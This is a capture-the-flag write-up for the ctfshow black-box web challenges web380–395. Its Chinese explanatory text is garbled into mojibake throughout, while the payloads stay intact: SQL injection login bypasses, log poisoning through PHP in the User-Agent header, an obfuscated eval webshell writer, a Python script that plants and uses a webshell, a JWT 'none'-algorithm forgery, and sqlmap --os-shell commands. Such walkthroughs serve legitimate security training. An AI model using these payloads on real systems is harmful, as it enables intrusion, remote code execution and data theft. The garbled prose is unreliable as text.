## ctfshow_é»‘ç›’æµ‹è¯•

ç©ç‚¹æœ‰æ„æ€çš„é»‘ç›’æµ‹è¯•

### web380

![image-20221223174217622](é»‘ç›’æµ‹è¯•.assets/image-20221223174217622.png)

æ‰“å¼€é¡µé¢åˆ°å¤„ç‚¹äº†ä¸€ä¸‹å¹¶æ²¡æœ‰å‘ç°ä»€ä¹ˆå¯ç–‘çš„åœ°æ–¹

ç›´æ¥æ‰«åå°

```bash
[17:43:01] 200 -    0B  - /flag.php
[17:43:25] 200 -  119B  - /page.php
```

ç›´æ¥è®¿é—®`/flag.php`æ˜¯æ²¡å›æ˜¾çš„

![image-20221223174421400](é»‘ç›’æµ‹è¯•.assets/image-20221223174421400.png)

è®¿é—®`page.php`

```
https://bef57593-24e7-43af-a254-6b0a6ea55810.challenge.ctf.show/page.php?id=flag
```

å¾—åˆ°flag

### web381

ä¸ä¸Šé¢˜ä¸€æ ·è®¿é—®`page.php`

![image-20221223174626636](é»‘ç›’æµ‹è¯•.assets/image-20221223174626636.png)

è§„å®šäº†å‰ç¼€å’Œåç¼€ï¼Œæ„Ÿè§‰æ²¡æ³•åˆ©ç”¨

è®¿é—®æºç å‘ç°ä¸€ä¸ªå¥‡æ€ªçš„è·¯å¾„

![image-20221223174810890](é»‘ç›’æµ‹è¯•.assets/image-20221223174810890.png)

è®¿é—®`/alsckdfy`å¾—åˆ°flag ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ

### web382

æ¥ç€è®¿é—®ä¸Šé¢˜çš„è·¯å¾„ï¼Œè¿™æ¬¡æ˜¯ä¸€ä¸ªç™»å½•æ¡†

ç®€å•çš„sqlæ³¨å…¥ï¼Œç™»é™†è¿›å»å°±æ‹¿åˆ°flag

```
p=1&u=1'||1=1;#
```

### web383

åŒä¸Š

### web384

æç¤º`å¯†ç å‰2ä½æ˜¯å°å†™å­—æ¯ï¼Œåä¸‰ä½æ˜¯æ•°å­—`

æˆ‘å°±ä¸çˆ†ç ´äº†ã€‚ã€‚

`è´¦å· admin å¯†ç  xy123`

### web385

è®¿é—®`install/?install`é‡ç½®å¯†ç 

ç„¶åç”¨`admin admin888`ç™»é™†

### web386

è®¿é—®`clear.php`

![image-20221223183029567](é»‘ç›’æµ‹è¯•.assets/image-20221223183029567.png)

é‚£ä¼°è®¡å°±æ˜¯**file**æ˜¯å‚æ•°

è®¿é—®`/install`æ˜¯è¯´å·²ç»å®‰è£…è¿‡äº†ï¼Œé‚£å°±åˆ é™¤`?file=install/lock.dat`ï¼Œç„¶åé‡ç½®å¯†ç ç™»é™†

### web387

ç›´æ¥ç”¨`clear.php`åˆ ä¸æ‰äº†

æœ‰ä¸€ä¸ª`debug`

å¯ä»¥**æ–‡ä»¶åŒ…å«**

```php
http://fb1d3e45-2ece-4ee3-af3c-50b4a55bb762.challenge.ctf.show/debug/?file=/var/log/nginx/access.log
```

ç›´æ¥æ—¥å¿—æ–‡ä»¶åŒ…å«åˆ æ‰**lock.dat**

```php
user-agent:<?php unlink('/var/www/html/install/lock.dat')?>
```

ç„¶åç»§ç»­ä¸Šè¿°æ­¥éª¤

### web388

å¤šäº†ä¸€ä¸ªç›®å½•`/alsckdfy/editor/`

æ—¥å¿—æ–‡ä»¶åŒ…å«å¤šäº†è¿‡æ»¤

**é¢„æœŸè§£**

 [CVE-2017-1002024](https://wiki.96.mk/Webå®‰å…¨/Kindeditor/ï¼ˆCVE-2017-1002024ï¼‰Kindeditor <%3D4.1.11 ä¸Šä¼ æ¼æ´/)

ä¸Šä¼ ä¸€ä¸ªå…æ€ğŸç»•è¿‡

```php
<?php
$a = '<?ph'.'p ev'.'al($_PO'.'ST[1]);?>';
file_put_contents('/var/www/html/1.php',$a);
?>
```

ç„¶ååˆ©ç”¨`/debug`å†™å…¥æ—¥å¿—

![image-20221223191744828](é»‘ç›’æµ‹è¯•.assets/image-20221223191744828.png)

ç„¶åæ—¥å¿—åŒ…å«ï¼Œæ‰§è¡Œphpä»£ç 

ç„¶åè®¿é—®`1.php` **rce**

**éé¢„æœŸ**

ç»•è¿‡æ—¥å¿—æ–‡ä»¶çš„å†™å…¥

```python
import requests
import base64
url="http://fb707431-ebb7-41c8-9ce7-57da16163fec.chall.ctf.show/"
url2="http://fb707431-ebb7-41c8-9ce7-57da16163fec.chall.ctf.show/debug/?file=/var/log/nginx/access.log"
cmd=b"<?php eval($_POST[1]);?>"
cmd=base64.b64encode(cmd).decode()
headers={
	'User-Agent':'''<?php system('echo {0}|base64 -d  > /var/www/html/b.php');?>'''.format(cmd)
}
print(headers)
requests.get(url=url,headers=headers)
requests.get(url2)
print(requests.post(url+'b.php',data={'1':'system("cat alsckdfy/check.php");'}).text)
```

### web389

åœ¨ä¸Šé¢˜çš„åŸºç¡€ä¸Šå¤šäº†ä¸€ä¸ª`jwt`ï¼Œç›´æ¥**none**åŠ å¯†ä¼ªé€ ç»•è¿‡å°±å¥½äº†

```python
from email import header
import jwt
import datetime

#è‡ªå·±ç»„ç»‡payload
payload = {
  "iss": "admin",
  "iat": 1671849947,
  "exp": 1671857147,
  "nbf": 1671849947,
  "sub": "admin",
  "jti": "03991dd75449ec147dc38c7caa8596d7"
}
header={
  "alg": "none",
  "typ": "JWT"
}

jwt_token=jwt.encode(payload, #payload
                     "", #key
                     algorithm='none', #ç®—æ³•
                     headers=header #header
                     )
print(jwt_token)
```

### web390

pageé¡µé¢åˆç›´æ¥çš„phpæ–‡ä»¶å˜æˆäº†

```
http://dae903a6-fd52-4316-8473-5a0535389b61.challenge.ctf.show/page.php?id=1
```

å­˜åœ¨**sqlæ³¨å…¥**

æ— ä»»ä½•è¿‡æ»¤ï¼Œé‚£å°±ç›´æ¥ä¸Š**sqlmap**äº†

```bash
sqlmap -u "http://dae903a6-fd52-4316-8473-5a0535389b61.challenge.ctf.show/page.php?id=1" --os-shell
```

å¯ä»¥ç›´æ¥æ‹¿åˆ°**shell**

### web391

æ³¨å…¥ç‚¹å˜äº†

```
http://728e2493-f933-42d9-a8e5-11f9358f7265.challenge.ctf.show/search.php?title=1
```

åŒä¸Šsqlmapä¸€æŠŠæ¢­

```bash
sqlmap -u "http://728e2493-f933-42d9-a8e5-11f9358f7265.challenge.ctf.show/search.php?title=1" --os-shell
```

### web392

åŒä¸Š

### web393

å¤šäº†ä¸€ä¸ªæœç´¢åŠŸèƒ½ï¼Œå…ˆåˆ©ç”¨search.phpè¿›è¡Œå †å æ³¨å…¥ï¼Œå°†flagæ’å…¥åˆ°æœç´¢åŠŸèƒ½ä¸­çš„æ•°æ®åº“ä¸­

```
search.php?title=1';insert into link values(10,'a','file:///flag');
```

ç„¶åæœç´¢10å°±å¥½äº†

```
link.php?id=10
```

### web394-395

ç¬¬ä¸€ç§æ˜¯å’Œä¸Šé¢˜ä¸€æ ·ï¼Œåªä¸è¿‡å¤šäº†ä¸€ä¸ª**hex**ç¼–ç 

ç¬¬äºŒç§åŠæ³•æ˜¯**ssrfæ‰“redis**ï¼Œå› ä¸ºtitleæ˜¯å­˜åœ¨urlè®¿é—®ï¼Œå¯ä»¥æ‰“ssrfçš„



